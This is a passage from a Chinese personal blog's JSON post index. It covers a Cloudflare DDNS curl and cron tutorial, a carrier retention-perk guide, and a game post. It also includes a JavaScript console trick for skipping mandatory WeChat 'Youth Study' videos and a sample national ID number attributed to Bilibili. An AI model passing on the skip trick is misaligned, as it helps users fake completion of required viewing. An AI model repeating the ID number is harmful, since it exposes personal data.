时使用的邮箱 Zone_ID这个位于你的域名设置右边的 API 分类下的 Zone ID 可直接复制下来以备使用 API_Key找到 Zone_ID 之后，点击下面的获取您的API令牌 进入页面后，点击API密钥栏 Global API Key 后面的 查看 即可获取 脚本创建DNS Record1234567curl -X POST &quot;https://api.cloudflare.com/client/v4/zones/8ee1be75cxxxx(你的Zone_ID)/dns_records&quot; \\ -H &quot;X-Auth-Email: xxxx(你的帐号的邮箱)&quot; \\ -H &quot;X-Auth-Key: 123456bdxxxx(你的Api_Key)&quot; \\ -H &quot;Content-Type: application/json&quot; \\ --data '{&quot;type&quot;:&quot;A&quot;,&quot;name&quot;:&quot;example.com（指定要创建记录的域名）&quot;,&quot;content&quot;:&quot;127.0.0.1(指定A记录指向的IP)&quot;,&quot;ttl&quot;:120（指定TTL）,&quot;proxied&quot;:false}'#返回结果{&quot;result&quot;:{&quot;id&quot;:&quot;123456xxxx(这条创建的DNS记录的ID)&quot;,&quot;type&quot;:&quot;A&quot;,&quot;name&quot;:&quot;eg.example.com（创建记录的域名）&quot;,&quot;content&quot;:&quot;127.0.0.1(A记录指向的IP)&quot;,&quot;proxiable&quot;:false,&quot;proxied&quot;:false,&quot;ttl&quot;:120,&quot;locked&quot;:false,&quot;zone_id&quot;:&quot;123456cxxxx(你的Zone_ID)&quot;,&quot;zone_name&quot;:&quot;example.com&quot;,&quot;modified_on&quot;:&quot;2020-04-12T16:38:18.430924Z&quot;,&quot;created_on&quot;:&quot;2020-04-12T16:38:18.430924Z&quot;,&quot;meta&quot;:{&quot;auto_added&quot;:false}},&quot;success&quot;:true（指命令执行成功）,&quot;errors&quot;:[],&quot;messages&quot;:[]} 查看 DNS Record 列表执行下面这个命令后，Shell 窗口中会列出你的帐号上的所有 DNS 记录（不仅仅是A记录）在 CloudFlare ，每一条解析记录都有对应的一个固定的 ID为了能够通过 API 修改解析记录，我们需要通过此步骤来获取这个 ID 123456curl -X GET &quot;https://api.cloudflare.com/client/v4/zones/8ee1be75cxxxx(你的Zone_ID)/dns_records&quot; \\ -H &quot;X-Auth-Email: xxxx(你的帐号的邮箱)&quot; \\ -H &quot;X-Auth-Key: 123456bdxxxx(你的Api_Key)&quot; \\ -H &quot;Content-Type: application/json&quot;#返回结果{&quot;result&quot;:[{&quot;id&quot;:&quot;1234aca56xxxx(这条被查看记录的ID)&quot;,&quot;type&quot;:&quot;A&quot;,&quot;name&quot;:&quot;eg.example.com（域名）&quot;,&quot;content&quot;:&quot;xx.xx.xx.xx(A记录指向的IP)&quot;,&quot;proxiable&quot;:true,&quot;proxied&quot;:true（启用cloudflare反代与否的状态值）,&quot;ttl&quot;:1（1 表示自动TTL）,&quot;locked&quot;:false,&quot;zone_id&quot;:&quot;8ee1be75cxxxx(我的zone_id)&quot;,&quot;zone_name&quot;:&quot;example.com（根域名）&quot;,&quot;modified_on&quot;:&quot;2020-04-12T15:24:00.567936Z&quot;,&quot;created_on&quot;:&quot;2020-04-12T15:24:00.567936Z&quot;,&quot;meta&quot;:{&quot;auto_added&quot;:false}}} 其中的 &quot;id&quot;:&quot;1234aca56xxxx&quot; 就是你需要的 DNS 记录的 ID 使脚本自动获取你的IP并让CloudFlare解析当获取到了需要的一切,可按照以下编辑你的.sh脚本: 1234567ipl=$(ifconfig (你拨号设备的名称，可通过ifconfig查看) | awk '/inet addr/{print substr($2,6)}') #获取你设备所使用的IPip=$(curl -s http://ipv4.icanhazip.com)curl -k -X PUT &quot;https://api.cloudflare.com/client/v4/zones/(你的Zone_ID)/dns_records/(这条被查看记录的ID)&quot; \\ -H &quot;X-Auth-Email: xxxx(你的帐号的邮箱)&quot; \\ -H &quot;X-Auth-Key: 123456bdxxxx(你的Api_Key)&quot; \\ -H &quot;Content-Type: application/json&quot; \\ --data '{&quot;type&quot;:&quot;A&quot;,&quot;name&quot;:&quot;你想使用的域名&quot;,&quot;content&quot;:&quot;'${ipl}'&quot;,&quot;ttl&quot;:120,&quot;proxied&quot;:false}' 为了方便了解该脚本的执行时间，以及CloudFlare所获取的IP,可自行测试以下命令(虽然我写的看起来像个笨比): 1export ipl=$(ifconfig ppp0 | awk '/inet addr/{print substr($2,6)}') &amp;&amp; bash (PATH_TO_SCRIPT) &amp;&amp; echo `date +&quot;%Y-%m-%d %H:%M:%S&quot;` Done $ipl &gt;&gt; /tmp/ddns.txt 执行完后，即可使用 tail -f /tmp/ddns.txt 查看是否执行完成 如果想让脚本在某时段运行，具体可参照此处下面展示我配置的crontab： 10 0 * * * export ipl=$(ifconfig ppp0 | awk '/inet addr/{print substr($2,6)}') &amp;&amp; bash /media/AiDisk_a1/ddns.sh &amp;&amp; echo `date +&quot;%Y-%m-%d %H:%M:%S&quot;` Done $ipl &gt;&gt; /tmp/ddns.txt 该crontab表示每天零点自动执行脚本 教程就到此结束啦!本博客文章均为原创，转载请注明来源","link":"/Blog/2020/04/21/%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B8%AD%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8CloudFlare%E7%9A%84DDNS/"},{"title":"跳过微信青年大学习的方法","text":"第一步微信打开http://debugmm.qq.com/?forcex5=true来打开腾讯X5内核第二步 退出上个链接，微信打开:http://debugtbs.qq.com来安装腾讯X5内核第三步 微信打开:http://debugx5.qq.com进入信息界面，勾选打开vConsole调试功能，如图: 随后进入青年大学习界面开始观看视频，右下角会出现vConsole按钮，点击后输入如下js代码: 1document.getElementById('Bvideo').currentTime=9999; 不出意外，视频全部跳过，只会留下一两个题目，随便选选就行辣！","link":"/Blog/2020/05/13/%E8%B7%B3%E8%BF%87%E5%BE%AE%E4%BF%A1%E9%9D%92%E5%B9%B4%E5%A4%A7%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%96%B9%E6%B3%95/"},{"title":"运营商福利，一起来白嫖流量！","text":"咕，今天试了下前段时间被刷屏的携号转网，发现运营商为挽留客户不择手段，今天白嫖了 6 个月 * 10GB 的流量爽到了 XDD（注意有限制 6 个月内无法转网） 条件首先你要是三网的客户（谁不是啊）其次你最近没有利用这个系统获取优惠（例如视频会员、话费、流量、充返资格等）第三你最近没有欠费、停机、销户等异常操作（主要是担心你发了短信后你异常状态客服不回电）第四你需要一台可以收发短信接听电话的设备（误）第五尽量没有限制你的套餐等（其实这个不是非常影响，建议可以尝试一下）目前测试下来福利有：话费、流量、视频会员、充返资格等。 具体看运气和当地运营商。步骤=== 第一步你需要编辑一条短信至 10001/10086/10010（对应电信 / 移动 / 联通） 内容是 1CXXZ#姓名#身份证号 注意：姓名和身份证号需为号码持有者本人的姓名和身份证号CXXZ# 张三 #440106198202020555（别问我是哪来的，问就是 B 站） 第二步耐心等待移动 / 电信 / 联通的骚扰电话 我以浙江移动为例，不知道是因为我电信不满足条件还是什么，2 个小时过去了还没收到电话，估计电信凉了。 下面是和客服的聊天记录（因为通话我习惯录音，所以直接转文字在改下识别结果（毕竟有些时候不准确）） 10086：尊敬的客户你好我是浙江移动的工作人员我们收到您发送的携号转我的短信所以冒昧来电是想问一下你是什么原因要办理携号转网呢？ 我：因为资费有点贵 10086：那用户您看这样行吗，我这边给您免费补偿 10 个 G 流量补偿一年时间可以留待移动公司可以吗？ 我：一年之后如果有需要的话还是可以转出的吧？ 10086：不影响的，那您同意的话呢，他就是这个月活动需要你在网移动就是十二个月时间到期之后你如果还想转出还是可以转出然后十二个月之内不能取消活动那需要支付违约金的。 我：好的 10086：那你同意的话我就马上给你送过来的要请您在手机上按一下一号键表示同意一下好吧 我：好的 10086：请稍等一下 确认音：确认办理请按一 10086：好的先生您的确认信息我收到了，等下您收到短信之后呢，流量就会到账请放心使用好吗 我：好的谢谢 10086：不客气，到期之后会自动结束的，谢谢您对我的支持，那我就不打扰你了，谢谢，再见。然后我就收到了短信。","link":"/Blog/2020/04/21/%E8%BF%90%E8%90%A5%E5%95%86%E7%A6%8F%E5%88%A9%EF%BC%8C%E4%B8%80%E8%B5%B7%E6%9D%A5%E7%99%BD%E5%AB%96%E6%B5%81%E9%87%8F%EF%BC%81/"},{"title":"这就是太刀侠的魅力吗，i了i了","text":"前天闲来无事打打下位救援，这最后一击帅到我了 @(huaji_djy)","link":"/Blog/2020/10/19/%E8%BF%99%E5%B0%B1%E6%98%AF%E5%A4%AA%E5%88%80%E4%BE%A0%E7%9A%84%E9%AD%85%E5%8A%9B%E5%90%97%EF%BC%8Ci%E4%BA%86i%E4%BA%86/"}],"tags":[{"name":"Telegram","slug":"Telegram","link":"/Blog/tags/Telegram/"},{"name":"Bot","slug":"Bot","link":"/Blog/tags/Bot/"},{"name":"下载工具","slug":"下载工具","link":"/Blog/tags/%E4%B8%8B%E8%BD%BD%E5%B7%A5%E5%85%B7/"},{"name":"P2P","slug":"P2P","link":"/Blog/tags/P2P/"},{"name":"CloudFlare","slug":"CloudFlare","link":"/Blog/tags/CloudFlare/"},{"name":"CDN","slug":"CDN","link":"/Blog/tags/CDN/"},{"name":"扫描工具","slug":"扫描工具","link":"/Blog/tags/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/"},{"name":"Docker","slug":"Docker","link":"/Blog/tags/Docker/"},{"name":"GoogleDrive","slug":"GoogleDrive","link":"/Blog/tags/GoogleDrive/"},{"name":"PE工具","slug":"PE工具","link":"/Blog/tags/PE%E5%B7%A5%E5%85%B7/"},{"name":"源码","slug":"源码","link":"/Blog/tags/%E6%BA%90%E7%A0%81/"},{"name":"Github","slug":"Github","link":"/Blog/tags/Github/"},{"name":"jsdeliver","slug":"jsdeliver","link":"/Blog/tags/jsdeliver/"},{"name":"图床","slug":"图床","link":"/Blog/tags/%E5%9B%BE%E5%BA%8A/"},{"name":"hosts","slug":"hosts","link":"/Blog/tags/hosts/"},{"name":"Linux","slug":"Linux","link":"/Blog/tags/Linux/"},{"name":"DNS","slug":"DNS","link":"/Blog/tags/DNS/"},{"name":"OneDrive","slug":"OneDrive","link":"/Blog/tags/OneDrive/"},{"name":"Windows","slug":"Windows","link":"/Blog/tags/Windows/"},{"name":"UpgradeAll","slug":"UpgradeAll","link":"/Blog/tags/UpgradeAll/"},{"name":"Typecho","slug":"Typecho","link":"/Blog/tags/Typecho/"},{"name":"Redis","slug":"Redis","link":"/Blog/tags/Redis/"},{"name":"加速","slug":"加速","link":"/Blog/tags/%E5%8A%A0%E9%80%9F/"},{"name":"广告拦截","slug":"广告拦截","link":"/Blog/tags/%E5%B9%BF%E5%91%8A%E6%8B%A6%E6%88%AA/"},{"name":"Steam","slug":"Steam","link":"/Blog/tags/Steam/"},{"name":"Javascript","slug":"Javascript","link":"/Blog/tags/Javascript/"},{"name":"网页","slug":"网页","link":"/Blog/tags/%E7%BD%91%E9%A1%B5/"},{"name":"Metasploit","slug":"Metasploit","link":"/Blog/tags/Metasploit/"},{"name":"远控","slug":"远控","link":"/Blog/tags/%E8%BF%9C%E6%8E%A7/"},{"name":"RaiDrive","slug":"RaiDrive","link":"/Blog/tags/RaiDrive/"},{"name":"镜像下载","slug":"镜像下载","link":"/Blog/tags/%E9%95%9C%E5%83%8F%E4%B8%8B%E8%BD%BD/"},{"name":"LNMP","slug":"LNMP","link":"/Blog/tags/LNMP/"},{"name":"VPS","slug":"VPS","link":"/Blog/tags/VPS/"},{"name":"教程","slug":"教程","link":"/Blog/tags/%E6%95%99%E7%A8%8B/"},{"name":"编译","slug":"编译","link":"/Blog/tags/%E7%BC%96%E8%AF%91/"},{"name":"HSTS","slug":"HSTS","link":"/Blog/tags/HSTS/"},{"name":"博客","slug":"博客","link":"/Blog/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"MineCraft","slug":"MineCraft","link":"/Blog/tags/MineCraft/"},{"name":"UA","slug":"UA","link":"/Blog/tags/UA/"},{"name":"浏览器","slug":"浏览器","link":"/Blog/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"},{"name":"[object Object]","slug":"object-Object","link":"/Blog/tags/object-Object/"},{"name":"测试工具","slug":"测试工具","link":"/Blog/tags/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"},{"name":"Bing","slug":"Bing","link":"/Blog/tags/Bing/"},{"name":"API","slug":"API","link":"/Blog/tags/API/"},{"name":"壁纸","slug":"壁纸","link":"/Blog/tags/%E5%A3%81%E7%BA%B8/"},{"name":"手贱","slug":"手贱","link":"/Blog/tags/%E6%89%8B%E8%B4%B1/"},{"name":"青年大学习","slug":"青年大学习","link":"/Blog/tags/%E9%9D%92%E5%B9%B4%E5%A4%A7%E5%AD%A6%E4%B9%A0/"},{"name":"福利","slug":"福利","link":"/Blog/tags/%E7%A6%8F%E5%88%A9/"}],"categories":[{"name":"教程","slug":"教程","link":"/Blog/categories/%E6%95%99%E7%A8%8B/"},{"name":"实用工具","slug":"实用工具","link":"/Blog/categories/%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7/"},{"name":"干货","slug":"干货","link":"/Blog/categories/%E5%B9%B2%E8%B4%A7/"},{"name":"琐事","slug":"琐事","link":"/Blog/categories/%E7%90%90%E4%BA%8B/"},{"name":"游戏","slug":"游戏","link":"/Blog/categories/%E6%B8%B8%E6%88%8F/"}]}